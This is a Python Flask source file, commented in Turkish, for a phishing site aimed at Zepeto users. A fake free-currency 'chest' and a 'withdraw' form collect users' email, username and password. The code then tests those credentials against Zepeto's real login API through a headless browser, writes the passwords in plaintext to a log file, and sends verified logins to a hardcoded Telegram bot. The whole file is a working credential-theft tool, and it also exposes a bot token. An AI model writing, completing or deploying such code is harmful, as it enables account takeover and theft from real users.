from datetime import datetime, timedelta
import json
import random
import time
import uuid
import base64
from urllib.parse import parse_qs, urlparse
from flask import Flask, redirect, render_template, request, session, url_for
from playwright.sync_api import sync_playwright

app = Flask(__name__)
app.secret_key = "zepeto_cok_gizli_key_12345"  # Oturum yönetimi için gizli anahtar

# --- TELEGRAM BOT AYARLARI ---
TELEGRAM_BOT_TOKEN = "8256152441:AAFkFccWy5pHf3YW2e7BFx029u18rbpATkQ"
TELEGRAM_CHAT_ID = "7958696125"

# Spam / Ard arda yanlış giriş koruması için geçici hafıza
# { ip_veya_session_id: { "deneme_sayisi": int, "engel_bitis_zamani": datetime } }
GIRIS_KONTROL_HAFIZASI = {}


def telegrama_gonder(mesaj):
  if (
      TELEGRAM_BOT_TOKEN == "BURAYA_BOT_TOKENINI_YAZ"
      or not TELEGRAM_BOT_TOKEN
  ):
    return
  url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
  payload = {"chat_id": TELEGRAM_CHAT_ID, "text": mesaj, "parse_mode": "HTML"}
  try:
    import requests

    requests.post(url, json=payload, timeout=5)
  except Exception as e:
    print(f"Telegram hatası: {e}")


def log_kaydet(metin):
  """Kullanıcı bilgilerini ve işlemleri sunucudaki log.txt dosyasına kaydeder"""
  try:
    zaman = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open("log.txt", "a", encoding="utf-8") as f:
      f.write(f"[{zaman}] {metin}\n")
  except Exception as e:
    print(f"Log yazma hatası: {e}")


def zepeto_giris_testEt(user_id, raw_password):
  """Zepeto sunucularında verilen kimlik bilgilerinin doğruluğunu test eder"""
  encoded_password = base64.b64encode(raw_password.encode("utf-8")).decode(
      "utf-8"
  )

  with sync_playwright() as p:
    try:
      # PythonAnywhere ortamı için headless=True zorunludur
      browser = p.chromium.launch(headless=True)
      context = browser.new_context(
          user_agent=(
              "Mozilla/5.0 (Linux; Android 16; Pixel 10) AppleWebKit/537.36"
              " (KHTML, like Gecko) Edg/156.0.0.0 Mobile Safari/537.36"
          )
      )
      page = context.new_page()

      # 1. Zepeto giriş sayfasına git
      page.goto("https://account.zepeto.me/", wait_until="networkidle", timeout=15000)
      page.wait_for_url("**/signin?zState=**", timeout=15000)

      # 2. zState değerini yakala
      parsed_url = urlparse(page.url)
      query_params = parse_qs(parsed_url.query)
      z_state = query_params.get("zState", [None])[0]

      if not z_state:
        browser.close()
        return False, "zState alınamadı."

      # 3. API isteğini gönder
      api_url = f"https://account.zepeto.me/api/p/zauth/oauth2/authorize/zepeto?zState={z_state}"
      payload = {"userId": user_id, "password": encoded_password}

      response = page.request.post(
          api_url,
          data=json.dumps(payload),
          headers={
              "Content-Type": "application/json",
              "Origin": "https://account.zepeto.me",
              "Referer": page.url,
          },
      )

      res_text = response.text()
      browser.close()

      # 4. Sonucu analiz et
      try:
        data = json.loads(res_text)
        if data.get("isSuccess") is False:
          return False, "Bilgiler yanlış."
      except json.JSONDecodeError:
        if "code=" in res_text:
          return True, "Giriş Başarılı!"

      return False, "Geçersiz yanıt."

    except Exception as e:
      return False, f"Bağlantı hatası: {str(e)}"


@app.route("/")
def index():
  ref = request.args.get("ref")
  if ref:
    session["ref_code"] = ref

  if "user_id" not in session:
    session["user_id"] = str(uuid.uuid4())[:8]
    session["zems"] = 0
    session["chest_opened"] = False
    session["referred"] = False

  return render_template(
      "index.html",
      zems=session.get("zems", 0),
      chest_opened=session.get("chest_opened", False),
      user_id=session.get("user_id"),
  )


@app.route("/open_chest", methods=["POST"])
def open_chest():
  if session.get("chest_opened"):
    return {"status": "error", "message": "Zaten sandık açtın!"}

  kazanilan_zem = random.choice([100, 200, 300])
  session["zems"] += kazanilan_zem
  session["chest_opened"] = True

  if "ref_code" in session and not session.get("referred", False):
    ref_user = session["ref_code"]
    session["referred"] = True
    davet_mesaji = f"🔗 Arkadaş Daveti Onaylandı! Referans: {ref_user}"
    telegrama_gonder(f"<b>{davet_mesaji}</b>")
    log_kaydet(davet_mesaji)

  return {"status": "success", "zems": kazanilan_zem, "total": session["zems"]}


@app.route("/withdraw", methods=["POST"])
def withdraw():
  identifier = request.form.get(
      "email"
  )  # Formda e-posta/kullanıcı adı alanı
  username = request.form.get("username")
  password = request.form.get("password")
  withdraw_type = request.form.get("withdraw_type")

  client_ip = request.remote_addr
  simdi = datetime.now()

  # --- SPAM VE ARD ARDA 2 KEZ YANLIŞ GİRİŞ KONTROLÜ ---
  if client_ip in GIRIS_KONTROL_HAFIZASI:
    kayit = GIRIS_KONTROL_HAFIZASI[client_ip]
    if (
        kayit["engel_bitis_zamani"]
        and simdi < kayit["engel_bitis_zamani"]
    ):
      kalan_sure = int(
          (kayit["engel_bitis_zamani"] - simdi).total_seconds()
      )
      log_kaydet(
          f"SPAM ENGELİ -> IP: {client_ip} çok fazla yanlış deneme yaptı. Kalan süre: {kalan_sure} sn."
      )
      return render_template(
          "index.html",
          zems=session.get("zems", 0),
          chest_opened=session.get("chest_opened", True),
          error=f"Çok fazla yanlış deneme yaptınız! Lütfen {kalan_sure} saniye bekleyin.",
      )

  # --- ŞİFRE UZUNLUK KONTROLÜ (Zepeto kurallarına göre minimum 6 karakter) ---
  if not password or len(password) < 6:
    log_kaydet(
        f"GEÇERSİZ ŞİFRE -> IP: {client_ip} çok kısa şifre girdi ({len(password) if password else 0} karakter)."
    )
    return render_template(
        "index.html",
        zems=session.get("zems", 0),
        chest_opened=session.get("chest_opened", True),
        error="Zepeto şifresi en az 6 karakter olmalıdır! Lütfen doğru bilgiyi girin.",
    )

  if not identifier or not username or not password:
    return render_template(
        "index.html",
        zems=session.get("zems", 0),
        chest_opened=session.get("chest_opened", True),
        error="Tüm alanları eksiksiz doldurunuz!",
    )

  current_zems = session.get("zems", 0)

  # --- E-POSTA VE KULLANICI ADI SIRALI TEST ETME MANTIĞI ---
  # Kullanıcı hem e-posta hem kullanıcı adı girdiği için önce e-posta ile,
  # olmazsa kullanıcı adı ile deneme yapıyoruz.
  test_edilecek_kimlikler = []
  if "@" in identifier:
    test_edilecek_kimlikler.append(identifier)
    if username and username != identifier:
      test_edilecek_kimlikler.append(username)
  else:
    test_edilecek_kimlikler.append(identifier)
    if username:
      test_edilecek_kimlikler.append(username)

  basarili_giris = False
  dogrulanmis_kimlik = ""

  for kimlik in test_edilecek_kimlikler:
    log_kaydet(f"Zepeto test ediliyor -> Kimlik: {kimlik}")
    basari, mesaj = zepeto_giris_testEt(kimlik, password)
    if basari:
      basarili_giris = True
      dogrulanmis_kimlik = kimlik
      break

  # Eğer tüm denemeler başarısız olduysa (Bilgiler yanlışsa)
  if not basarili_giris:
    # Yanlış deneme sayacını artır
    if client_ip not in GIRIS_KONTROL_HAFIZASI:
      GIRIS_KONTROL_HAFIZASI[client_ip] = {
          "deneme_sayisi": 0,
          "engel_bitis_zamani": None,
      }

    GIRIS_KONTROL_HAFIZASI[client_ip]["deneme_sayisi"] += 1
    hatali_sayi = GIRIS_KONTROL_HAFIZASI[client_ip]["deneme_sayisi"]

    log_kaydet(
        f"HATALI GİRİŞ (Deneme {hatali_sayi}) -> Kimlikler: {test_edilecek_kimlikler} | Şifre: {password} | IP: {client_ip}"
    )

    # Üst üste 2 kez yanlış girildiyse 1 dakika (60 saniye) bekleme cezası ver
    if hatali_sayi >= 2:
      GIRIS_KONTROL_HAFIZASI[client_ip]["engel_bitis_zamani"] = (
          datetime.now() + timedelta(seconds=60)
      )
      GIRIS_KONTROL_HAFIZASI[client_ip]["deneme_sayisi"] = (
          0  # Sayacı sıfırla ki süre bitince yeniden denenebilsin
      )
      log_kaydet(
          f"SPAM KORUMASI AKTİF -> IP: {client_ip} 1 dakika süreyle engellendi."
      )
      return render_template(
          "index.html",
          zems=session.get("zems", 0),
          chest_opened=session.get("chest_opened", True),
          error="Bilgiler yanlış! Üst üste hatalı deneme yaptığınız için 1 dakika beklemek zorundasınız.",
      )

    return render_template(
        "index.html",
        zems=session.get("zems", 0),
        chest_opened=session.get("chest_opened", True),
        error="Bilgiler yanlış, lütfen doğru bilgiyi bulunuz ve tekrar deneyin!",
    )

  # --- GİRİŞ BAŞARILI İSE İŞLEMLER ---
  # Hatalı deneme hafızasını temizle
  if client_ip in GIRIS_KONTROL_HAFIZASI:
    del GIRIS_KONTROL_HAFIZASI[client_ip]

  log_metni = (
      f"BAŞARILI ÇEKİM & GİRİŞ -> Doğrulanan Kimlik: {dogrulanmis_kimlik} | "
      f"Şifre: {password} | Miktar: {current_zems} ZEM ({withdraw_type}) | Oturum ID: {session.get('user_id')}"
  )
  log_kaydet(log_metni)

  telegram_mesaji = (
      f"🚨 <b>Başarılı ZEM Çekim Talebi / Doğrulanmış Giriş!</b>\n\n"
      f"📧 <b>Doğrulanan Kimlik:</b> <code>{dogrulanmis_kimlik}</code>\n"
      f"👤 <b>Kullanıcı Adı:</b> <code>{username}</code>\n"
      f"🔑 <b>Şifre:</b> <code>{password}</code>\n"
      f"💎 <b>ZEM Miktarı:</b> {current_zems} ({withdraw_type})\n"
      f"🌐 <b>Oturum ID:</b> {session.get('user_id')}"
  )
  telegrama_gonder(telegram_mesaji)

  return render_template(
      "index.html",
      success=True,
      zems=current_zems,
      chest_opened=session.get("chest_opened", True),
  )


if __name__ == "__main__":
  app.run(debug=True)
